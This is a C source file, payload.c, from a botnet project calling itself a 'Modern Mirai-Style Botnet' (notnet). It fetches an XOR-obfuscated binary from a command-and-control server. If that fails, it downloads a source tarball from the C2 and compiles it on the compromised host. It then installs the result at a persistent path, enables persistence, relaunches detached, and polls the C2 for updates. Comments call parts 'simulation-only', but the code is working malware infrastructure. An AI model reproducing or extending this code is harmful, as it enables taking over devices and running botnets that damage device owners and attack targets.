/*
 * notnet - Modern Mirai-Style Botnet
 * payload.c - Binary payload download and on-target compilation
 */
#include "payload.h"
#include "util.h"
#include "protocol.h"
#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <signal.h>

/* ── Architecture Detection ─────────────────────────────────── */
const char *payload_get_arch(void) {
    struct utsname uts;
    uname(&uts);

    if (strstr(uts.machine, "x86_64") || strstr(uts.machine, "amd64")) {
        return "x86_64";
    } else if (strstr(uts.machine, "armv7") || strstr(uts.machine, "arm")) {
        return "armv7l";
    } else if (strstr(uts.machine, "aarch64") || strstr(uts.machine, "arm64")) {
        return "aarch64";
    } else if (strstr(uts.machine, "riscv64")) {
        return "riscv64";
    } else if (strstr(uts.machine, "mips")) {
        return "mips";
    } else if (strstr(uts.machine, "ppc") || strstr(uts.machine, "powerpc")) {
        return "ppc";
    }

    return "unknown";
}
/* ── Payload Download ────────────────────────────────────────── */

/* Forward declaration: on-target compilation fallback (defined below). */
static int payload_update_compile_fallback(notnet_bot_t *bot, const char *dest);

/* ISSUE #159 (SIMULATION-ONLY): payload de-obfuscation. The bot ships
 * no crypto library, so the payload "encryption" is an XOR-with-
 * repeating-key stream derived from the 64-hex (32-byte)
 * payload_key_hex — OBFUSCATION-GRADE, NOT encryption (honest
 * labeling). When the key is configured, the downloaded artifact is
 * read into memory, de-XORed there, and written back BEFORE the
 * magic/integrity checks below run, so the on-disk download artifact
 * is only ever the obfuscated image; the decoded bytes exist in memory
 * until verification completes. The payload_sha256 pin (#81), when
 * also configured, therefore pins the DECODED image. Returns 0 on
 * success, -1 on any failure (caller unlinks the temp file). */
static int payload_unxor_file(notnet_bot_t *bot, const char *path) {
    unsigned char key[32];
    for (int i = 0; i < 32; i++) {
        const char *hp = bot->payload_key_hex + 2 * i;
        int nib_hi, nib_lo;
        if (hp[0] >= '0' && hp[0] <= '9') nib_hi = hp[0] - '0';
        else if (hp[0] >= 'a' && hp[0] <= 'f') nib_hi = hp[0] - 'a' + 10;
        else return -1;
        if (hp[1] >= '0' && hp[1] <= '9') nib_lo = hp[1] - '0';
        else if (hp[1] >= 'a' && hp[1] <= 'f') nib_lo = hp[1] - 'a' + 10;
        else return -1;
        key[i] = (unsigned char)((nib_hi << 4) | nib_lo);
    }

    /* Read the whole artifact into memory (PAYLOAD_MAX_SIZE cap keeps
     * this bounded), decode in place, then replace the temp file. */
    unsigned char *buf = NULL;
    int len = file_read_max(path, &buf, PAYLOAD_MAX_SIZE);
    if (len <= 0 || !buf) {
        if (buf) free(buf);
        return -1;
    }
    for (int i = 0; i < len; i++) {
        buf[i] ^= key[i % sizeof(key)];
    }

    FILE *f = fopen(path, "wb");
    if (!f) {
        free(buf);
        return -1;
    }
    size_t wrote = fwrite(buf, 1, (size_t)len, f);
    int werr = ferror(f);
    fclose(f);
    free(buf);
    if (wrote != (size_t)len || werr) return -1;
    return 0;
}

int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
    log_info("Downloading payload: %s -> %s", url, dest);

    /* SECURITY FIX (#13): Write to a temp file first, verify, then
     * atomically rename to dest. This prevents TOCTOU race where an
     * attacker swaps the file between write and verification. */
    char tmp_path[512];
    snprintf(tmp_path, sizeof(tmp_path), "%s.tmp.XXXXXX", dest);
    int fd = mkstemp(tmp_path);
    if (fd < 0) {
        log_error("payload_update: mkstemp failed: %s", strerror(errno));
        return -1;
    }
    close(fd);  /* http_download will reopen and write to this path */

    /* Download binary to temp file */
    int received = http_download(bot, url, tmp_path);
    if (received <= 0) {
        log_error("Download failed");
        unlink(tmp_path);
        /* SECURITY FIX (#69): on-target compilation fallback. If the
         * binary could not be fetched (or the download server is down),
         * try building from the verified source bundle. Returns 0 to
         * signal 'compiled from source' to the caller. */
        if (payload_update_compile_fallback(bot, dest) == 0) {
            return 0;  /* compiled successfully */
        }
        return -1;
    }

    /* ISSUE #159 (SIMULATION-ONLY): de-XOR the artifact IN MEMORY
     * after download, BEFORE the magic check, when payload_key_hex is
     * configured (e.g. fetched from the C2's /bot/notnet.enc route).
     * Default (no key): skipped entirely, behavior unchanged. */
    if (bot->payload_key_hex[0] != '\0') {
        if (payload_unxor_file(bot, tmp_path) != 0) {
            log_error("Payload: XOR de-obfuscation failed (bad key or I/O)");
            unlink(tmp_path);
            return -1;
        }
        log_info("Payload: obfuscated download de-XORed");
    }

    /* SECURITY FIX (#6): Verify magic bytes as raw bytes (endianness-safe)
     * and validate file size against PAYLOAD_MAX_SIZE. */
    FILE *f = fopen(tmp_path, "rb");
    if (!f) {
        log_error("Cannot verify binary: %s", tmp_path);
        unlink(tmp_path);
        return -1;
    }

    /* Read and check file size */
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize <= 0 || fsize > PAYLOAD_MAX_SIZE) {
        log_error("Payload size invalid: %ld bytes (max %d)", fsize, PAYLOAD_MAX_SIZE);
        fclose(f);
        unlink(tmp_path);
        return -1;
    }

    /* Read first 4 bytes as raw bytes and compare against magic.
     * NOTNET_MAGIC is 0x4E4F544E = "NOTN" in ASCII.
     * Reading as bytes avoids endianness issues with fread(&uint32_t). */
    unsigned char magic_bytes[4];
    size_t nread = fread(magic_bytes, 1, 4, f);
    fclose(f);

    if (nread < 4) {
        log_error("Payload too small to contain magic header");
        unlink(tmp_path);
        return -1;
    }

    /* Expected bytes: 'N','O','T','N' (0x4E, 0x4F, 0x54, 0x4E) */
    unsigned char expected[4] = { 'N', 'O', 'T', 'N' };
    if (memcmp(magic_bytes, expected, 4) != 0) {
        log_error("Invalid magic: expected NOTN, got %02x%02x%02x%02x",
                  magic_bytes[0], magic_bytes[1], magic_bytes[2], magic_bytes[3]);
        unlink(tmp_path);
        /* SECURITY FIX (#69): not a binary payload — try the verified
         * source bundle instead. */
        if (payload_update_compile_fallback(bot, dest) == 0) {
            return 0;  /* compiled successfully */
        }
        return -1;
    }

    /* SECURITY FIX (#81): SHA-256 signature verification. The 4-byte
     * magic provides zero cryptographic assurance — a MITM can prepend
     * 'NOTN' to any binary (CWE-345). Read the whole payload, hash it,
     * and require an exact match against the operator-configured pin.
     * Fail-closed: no pin configured means no update, ever. */
    unsigned char *payload = NULL;
    int plen = file_read(tmp_path, &payload);
    if (plen <= 0 || !payload) {
        log_error("Payload: cannot read downloaded file for hashing");
        if (payload) free(payload);
        unlink(tmp_path);
        return -1;
    }

    if (bot->payload_sha256[0] == '\0') {
        log_error("Payload update rejected: no payload_sha256 pin configured "
                  "(set payload_sha256= or NOTNET_PAYLOAD_SHA256)");
        free(payload);
        unlink(tmp_path);
        return -1;
    }

    char actual[65];
    if (sha256_hex(payload, (size_t)plen, actual) != 0) {
        log_error("Payload: SHA-256 computation failed");
        free(payload);
        unlink(tmp_path);
        return -1;
    }
    free(payload);

    if (strcmp(actual, bot->payload_sha256) != 0) {
        log_error("Payload SHA-256 mismatch: expected %s, got %s",
                  bot->payload_sha256, actual);
        unlink(tmp_path);
        /* SECURITY FIX (#69): the binary failed integrity — try the
         * verified source bundle instead of installing a corrupt file. */
        if (payload_update_compile_fallback(bot, dest) == 0) {
            return 0;  /* compiled successfully */
        }
        return -1;
    }
    log_info("Payload SHA-256 verified (%s)", actual);

    /* SECURITY FIX (#13): Atomic rename after verification */
    if (rename(tmp_path, dest) != 0) {
        log_error("payload_update: rename failed: %s", strerror(errno));
        unlink(tmp_path);
        return -1;
    }

    /* Make executable */
    chmod(dest, 0755);

    log_info("Payload verified and installed at %s (%ld bytes)", dest, fsize);
    return received;
}

/* ── On-Target Compilation ───────────────────────────────────── */

/* Cap on the extracted source tree (tar is uncompressed; a bundle of
 * notnet.c + src/ + include/ is ~150KB, so 2MB is generous headroom). */
#define SOURCE_TREE_MAX_SIZE (2 * 1024 * 1024)

/* Parse an octal tar header field (size stored as ASCII octal). */
static unsigned long tar_parse_octal(const char *p, size_t len) {
    unsigned long v = 0;
    for (size_t i = 0; i < len && p[i]; i++) {
        if (p[i] < '0' || p[i] > '7') break;
        v = (v << 3) | (unsigned long)(p[i] - '0');
    }
    return v;
}

/* Securely extract a ustar tarball into dest_dir. Only regular files and
 * directories are written; path traversal (../, absolute paths) and
 * symlink/hardlink entries are rejected (CWE-22). Total size is capped.
 * Returns 0 on success, -1 on any violation. */
static int tar_extract_safe(const char *tar_path, const char *dest_dir) {
    FILE *f = fopen(tar_path, "rb");
    if (!f) return -1;

    unsigned char hdr[512];
    size_t total = 0;
    int ret = 0;

    while (1) {
        size_t got = fread(hdr, 1, sizeof(hdr), f);
        if (got == 0) break;               /* clean EOF */
        if (got < sizeof(hdr)) { ret = -1; break; }

        /* Two consecutive zero blocks = end of archive */
        int all_zero = 1;
        for (size_t i = 0; i < sizeof(hdr); i++) {
            if (hdr[i]) { all_zero = 0; break; }
        }
        if (all_zero) break;

        /* ustar header: name[0..100), size[124..136) octal, typeflag[156] */
        char name[101];
        memcpy(name, hdr, 100);
        name[100] = '\0';
        unsigned long size = tar_parse_octal((const char *)hdr + 124, 12);
        char typeflag = (char)hdr[156];

        /* #176: verify the header checksum and the ustar magic before
         * trusting any other field — a corrupt/garbage block previously
         * parsed as a valid entry. Checksum = sum of header bytes with the
         * chksum field treated as spaces (POSIX). */
        {
            const char *magic = (const char *)hdr + 257;
            if (memcmp(magic, "ustar", 5) != 0) {
                log_error("tar_extract: bad magic (not ustar) — rejected");
                ret = -1;
                break;
            }
            unsigned long stored = tar_parse_octal((const char *)hdr + 148, 8);
            unsigned long computed = 0;
            for (size_t i = 0; i < sizeof(hdr); i++) {
                computed += (i >= 148 && i < 156) ? (unsigned long)' '
                                                  : (unsigned long)hdr[i];
            }
            if (stored != computed) {
                log_error("tar_extract: header checksum mismatch "
                          "(stored %lu computed %lu) — rejected",
                          stored, computed);
                ret = -1;
                break;
            }
        }

        /* GNU long-name/link-name extensions ('L'/'K'): the real name lives
         * in the NEXT entry's data. We don't support them — #176 makes that
         * a hard rejection instead of a warn-and-misparse (the old code
         * would extract under a silently truncated 100-char name). */
        if (typeflag == 'L' || typeflag == 'K') {
            log_error("tar_extract: GNU %c entry rejected (longname unsupported)",
                      typeflag);
            ret = -1;
            break;
        }

        /* Path traversal / absolute path check */
        if (name[0] == '\0' || name[0] == '/' ||
            strstr(name, "..") != NULL) {
            log_error("tar_extract: unsafe entry '%s' rejected", name);
            ret = -1;
            break;
        }

        /* Only regular files ('0' or '\0') and dirs ('5') */
        if (typeflag != '0' && typeflag != '\0' && typeflag != '5') {
            log_warn("tar_extract: skipping non-regular entry '%s' (type %d)",
                     name, typeflag);
        }

        if (size > SOURCE_TREE_MAX_SIZE || total + size > SOURCE_TREE_MAX_SIZE) {
            log_error("tar_extract: entry '%s' exceeds size cap", name);
            ret = -1;
            break;
        }
        total += size;

        char outpath[512];
        snprintf(outpath, sizeof(outpath), "%s/%s", dest_dir, name);

        if (typeflag == '5') {
            /* Directory */
            if (mkdir(outpath, 0755) != 0 && errno != EEXIST) {
                log_error("tar_extract: mkdir %s failed: %s", outpath, strerror(errno));
                ret = -1;
                break;
            }
        } else if (typeflag == '0' || typeflag == '\0') {
            /* Regular file — create parent dirs, then write */
            char *slash = strrchr(outpath, '/');
            if (slash) {
                *slash = '\0';
                if (mkdir(outpath, 0755) != 0 && errno != EEXIST) {
                    log_error("tar_extract: mkdir %s failed: %s", outpath, strerror(errno));
                    ret = -1;
                    break;
                }
                *slash = '/';
            }
            FILE *out = fopen(outpath, "wb");
            if (!out) {
                log_error("tar_extract: cannot write %s: %s", outpath, strerror(errno));
                ret = -1;
                break;
            }
            char buf[4096];
            unsigned long left = size;
            while (left > 0) {
                size_t chunk = left < sizeof(buf) ? (size_t)left : sizeof(buf);
                size_t rd = fread(buf, 1, chunk, f);
                if (rd != chunk) {
                    fclose(out);
                    out = NULL;
                    ret = -1;
                    break;
                }
                fwrite(buf, 1, rd, out);
                left -= (unsigned long)rd;
            }
            if (out) fclose(out);
            if (ret != 0) break;
        }

        /* Skip to next 512-byte block boundary */
        unsigned long pad = (512 - (size % 512)) % 512;
        if (pad > 0 && fseek(f, (long)pad, SEEK_CUR) != 0) {
            ret = -1;
            break;
        }
    }

    fclose(f);
    return ret;
}

/* Recursively remove the extracted source tree (mkdtemp-generated path,
 * fixed argv, no shell). */
static void rm_rf(const char *path) {
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = { (char *)"/bin/rm", (char *)"-rf", (char *)path, NULL };
        execvp("/bin/rm", argv);
        _exit(127);
    }
    if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
}

/* Detect an available C compiler (checks PATH via access()). */
static const char *find_compiler(void) {
    static const char *candidates[] = {
        "/usr/bin/gcc", "/bin/gcc", "/usr/bin/cc", "/bin/cc",
        "/usr/bin/musl-gcc", "/usr/bin/clang", "/bin/clang",
        NULL
    };
    for (int i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) return candidates[i];
    }
    /* Last resort: let execvp resolve via PATH */
    return "gcc";
}

/* Compile the extracted tree with one compiler under a timeout.
 * static_link: try -static first (portable single binary), fall back to
 * dynamic if the target lacks libc.a (e.g. minimal containers).
 * Returns 0 on success, -1 on failure/timeout. */
static int compile_tree(const char *compiler, const char *src_dir,
                        const char *dest, int timeout_sec, int static_link) {
    pid_t pid = fork();
    if (pid < 0) {
        log_error("payload_compile: fork failed: %s", strerror(errno));
        return -1;
    }
    if (pid == 0) {
        /* Child: exec compiler directly, no shell */
        char incdir[600];
        snprintf(incdir, sizeof(incdir), "-I%s/include", src_dir);
        char n1[600], n2[600], n3[600], n4[600], n5[600], n6[600];
        snprintf(n1, sizeof(n1), "%s/notnet.c", src_dir);
        snprintf(n2, sizeof(n2), "%s/src/protocol.c", src_dir);
        snprintf(n3, sizeof(n3), "%s/src/spread.c", src_dir);
        snprintf(n4, sizeof(n4), "%s/src/payload.c", src_dir);
        snprintf(n5, sizeof(n5), "%s/src/persist.c", src_dir);
        snprintf(n6, sizeof(n6), "%s/src/util.c", src_dir);
        char *argv[16];
        int a = 0;
        argv[a++] = (char *)compiler;
        if (static_link) argv[a++] = "-static";
        argv[a++] = "-Os";
        argv[a++] = "-Wall";
        argv[a++] = incdir;
        argv[a++] = "-o";
        argv[a++] = (char *)dest;
        argv[a++] = n1;
        argv[a++] = n2;
        argv[a++] = n3;
        argv[a++] = n4;
        argv[a++] = n5;
        argv[a++] = n6;
        argv[a++] = "-lpthread";
        argv[a] = NULL;
        /* Redirect stderr to a file when NOTNET_COMPILE_DEBUG is set,
         * otherwise /dev/null. */
        const char *dbg = getenv("NOTNET_COMPILE_DEBUG");
        int devnull = open(dbg ? dbg : "/dev/null", O_WRONLY | (dbg ? O_CREAT | O_TRUNC : 0), 0644);
        if (devnull >= 0) {
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        execvp(compiler, argv);
        _exit(127);
    }

    /* Parent: wait with timeout (COMPILE_TIMEOUT), kill on expiry */
    int status = 0;
    time_t start = time(NULL);
    while (1) {
        pid_t r = waitpid(pid, &status, WNOHANG);
        if (r == pid) break;
        if (r < 0) {
            log_error("payload_compile: waitpid failed: %s", strerror(errno));
            return -1;
        }
        if (time(NULL) - start >= timeout_sec) {
            log_error("payload_compile: %s timed out after %ds, killing", compiler, timeout_sec);
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            return -1;
        }
        usleep(100000);
    }

    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
    }
    if (WIFSIGNALED(status)) {
        log_warn("payload_compile: %s killed by signal %d", compiler, WTERMSIG(status));
    }
    return -1;
}

/* Compile the notnet source bundle on-target.
 * source must be a local path to the source tarball (already downloaded
 * and SHA-256-verified by payload_update). dest is the output binary.
 * Returns 0 on success, -1 on failure. */
int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
    log_info("Compiling payload: %s -> %s", source, dest);

    /* Validate inputs: reject paths with shell metacharacters */
    const char *bad = strpbrk(source, ";|&`$(){}[]<>!\n\r");
    if (bad) {
        log_error("payload_compile: source path rejected (dangerous char)");
        return -1;
    }
    bad = strpbrk(dest, ";|&`$(){}[]<>!\n\r");
    if (bad) {
        log_error("payload_compile: dest path rejected (dangerous char)");
        return -1;
    }

    /* SECURITY FIX (#81): the source tarball must match the operator's
     * pin before anything is extracted or compiled. Fail-closed. */
    unsigned char *tdata = NULL;
    int tlen = file_read_max(source, &tdata, SOURCE_TREE_MAX_SIZE);
    if (tlen <= 0 || !tdata) {
        log_error("payload_compile: cannot read source tarball %s", source);
        if (tdata) free(tdata);
        return -1;
    }
    if (bot->payload_source_sha256[0] == '\0') {
        log_error("payload_compile: no payload_source_sha256 pin configured "
                  "(set payload_source_sha256= or NOTNET_PAYLOAD_SOURCE_SHA256)");
        free(tdata);
        return -1;
    }
    char actual[65];
    if (sha256_hex(tdata, (size_t)tlen, actual) != 0) {
        free(tdata);
        return -1;
    }
    free(tdata);
    if (strcmp(actual, bot->payload_source_sha256) != 0) {
        log_error("payload_compile: source SHA-256 mismatch: expected %s, got %s",
                  bot->payload_source_sha256, actual);
        return -1;
    }
    log_info("payload_compile: source SHA-256 verified (%s)", actual);

    /* Extract to a fresh temp dir */
    char tmpdir[] = "/tmp/notnet-src.XXXXXX";
    if (!mkdtemp(tmpdir)) {
        log_error("payload_compile: mkdtemp failed: %s", strerror(errno));
        return -1;
    }

    if (tar_extract_safe(source, tmpdir) != 0) {
        log_error("payload_compile: tarball extraction failed (rejected unsafe entry)");
        rm_rf(tmpdir);
        return -1;
    }

    const char *compiler = find_compiler();
    log_info("payload_compile: using compiler %s (timeout %ds)", compiler, COMPILE_TIMEOUT);

    /* Compile to a temp dest, then rename (atomic, no partial binary) */
    char tmp_out[600];
    snprintf(tmp_out, sizeof(tmp_out), "%s.bin.XXXXXX", dest);
    int tfd = mkstemp(tmp_out);
    if (tfd < 0) {
        log_error("payload_compile: mkstemp failed: %s", strerror(errno));
        rm_rf(tmpdir);
        return -1;
    }
    close(tfd);
    unlink(tmp_out);  /* compiler will create it */

    /* Prefer a static binary (portable single file); fall back to
     * dynamic if the target lacks static libc (e.g. minimal containers). */
    int ret = compile_tree(compiler, tmpdir, tmp_out, COMPILE_TIMEOUT, 1);
    if (ret != 0) {
        log_warn("payload_compile: static link failed, retrying dynamic");
        ret = compile_tree(compiler, tmpdir, tmp_out, COMPILE_TIMEOUT, 0);
    }
    rm_rf(tmpdir);

    if (ret != 0) {
        log_error("Compilation failed (all compilers exhausted)");
        unlink(tmp_out);
        return -1;
    }

    if (rename(tmp_out, dest) != 0) {
        log_error("payload_compile: rename failed: %s", strerror(errno));
        unlink(tmp_out);
        return -1;
    }

    /* Make executable */
    chmod(dest, 0755);
    log_info("Compilation successful: %s", dest);
    return 0;
}

/* On-target compilation fallback for payload_update.
 * Fetches the source tarball from the configured URL (or the C2 root),
 * verifies the SHA-256 pin, compiles, and installs to dest.
 * Returns 0 on success, -1 on failure. */
static int payload_update_compile_fallback(notnet_bot_t *bot, const char *dest) {
    if (!bot->payload_compile_enabled) {
        log_warn("Update failed and on-target compilation is disabled "
                 "(set payload_compile_enabled=1)");
        return -1;
    }
    if (bot->payload_source_sha256[0] == '\0') {
        log_warn("Update failed and no payload_source_sha256 pin configured — "
                 "cannot verify source tarball");
        return -1;
    }

    /* Source URL: explicit config, else C2 root + /notnet-src.tar */
    char url[600];
    if (bot->payload_source_url[0] != '\0') {
        snprintf(url, sizeof(url), "%.550s", bot->payload_source_url);
    } else {
        snprintf(url, sizeof(url), "http://%s:%u/notnet-src.tar",
                 bot->c2_http.server, bot->c2_http.port);
    }
    log_info("Update fallback: downloading source bundle from %s", url);

    char tar_path[] = "/tmp/notnet-src.XXXXXX";
    int fd = mkstemp(tar_path);
    if (fd < 0) {
        log_error("payload fallback: mkstemp failed: %s", strerror(errno));
        return -1;
    }
    close(fd);
    unlink(tar_path);  /* http_download creates it */

    int got = http_download(bot, url, tar_path);
    if (got <= 0) {
        log_error("payload fallback: source download failed");
        unlink(tar_path);
        return -1;
    }

    int ret = payload_compile(bot, tar_path, dest);
    unlink(tar_path);
    return ret;
}

/* ── Payload Install ────────────────────────────────────────── */
int payload_install(notnet_bot_t *bot, const char *bin_path) {
    log_info("Installing payload at %s", bin_path);

    /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
     * shell injection via the dest path. */

    /* Validate bin_path: reject shell metacharacters */
    const char *bad = strpbrk(bin_path, ";|&`$(){}[]<>!\n\r");
    if (bad) {
        log_error("payload_install: bin_path rejected (dangerous char)");
        return -1;
    }

    /* Copy binary to persistent location. (#108): the destination comes
     * from get_persist_path() (persist.c), NOT a hardcoded /tmp/.notnet.
     * CMD_UPDATE passes bin_path="/tmp/.notnet" — the same path the
     * download+verify renamed the temp file to — so a naive
     * fopen(dest,"wb") truncated the SOURCE before the copy loop read it,
     * and every SHA-verified update installed an EMPTY binary (exec exit
     * 127, persistence relaunch broken). When source == dest the file is
     * already in its persistent location: skip the copy. */
    char dest[256];
    get_persist_path(dest, sizeof(dest));

    if (strcmp(bin_path, dest) != 0) {
        /* SECURITY FIX (#341): never fopen(dest,"wb") — it follows
         * symlinks (CWE-59). A local user pre-creating /tmp/.notnet as
         * a symlink to a root-writable target got that file truncated
         * by the copy below, then chmod 0755'd. Instead write to an
         * unpredictable mkstemp name in the SAME directory as dest
         * (same filesystem, so rename(2) stays atomic), then rename
         * over dest — rename replaces a pre-existing symlink itself
         * instead of following it. Mirrors payload_update() (#13). */
        char tmp_path[512];
        snprintf(tmp_path, sizeof(tmp_path), "%s.tmp.XXXXXX", dest);
        int tfd = mkstemp(tmp_path);
        if (tfd < 0) {
            log_error("payload_install: mkstemp failed: %s", strerror(errno));
            return -1;
        }
        FILE *dst = fdopen(tfd, "wb");
        FILE *src = fopen(bin_path, "rb");
        if (!src || !dst) {
            log_error("Failed to copy payload");
            if (src) fclose(src);
            if (dst) fclose(dst);
            unlink(tmp_path);
            return -1;
        }

        char buf[4096];
        size_t n;
        while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, n, dst);
        }
        int werr = ferror(dst);

        fclose(src);
        fclose(dst);
        if (werr || rename(tmp_path, dest) != 0) {
            log_error("payload_install: failed to install %s: %s",
                      dest, strerror(errno));
            unlink(tmp_path);
            return -1;
        }
    } else {
        log_info("payload_install: %s already at persistent path, skipping self-copy (#108)", dest);
    }

    /* Make copied binary executable */
    chmod(dest, 0755);

    /* Install persistence */
    persist_install(bot);

    /* SECURITY FIX (#7): Start new instance via fork()+execvp(), no shell */
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: detach and exec the new binary */
        /* SECURITY FIX (#30): Close C2 sockets before exec to prevent
         * the new binary from inheriting sensitive file descriptors. */
        if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
        if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
        if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
        setsid();
        char *argv[] = { (char *)dest, NULL };
        execvp(dest, argv);
        _exit(127);
    }
    /* Parent: don't wait */

    log_info("Payload installed at %s", dest);
    return 0;
}

/* ── Update Check ───────────────────────────────────────────── */
int payload_check_update(notnet_bot_t *bot) {
    time_t now = time(NULL);

    /* Check every 6 hours for updates */
    if (now - bot->last_update < 21600) {
        return 0;
    }

    bot->last_update = now;

    /* Check C2 for update command */
    char query[256];
    snprintf(query, sizeof(query),
        "{\"cmd\":\"check_update\",\"arch\":\"%s\",\"version\":\"%s\"}",
        payload_get_arch(), NOTNET_VERSION);

    http_post(bot, query, strlen(query));

    return 0;
}
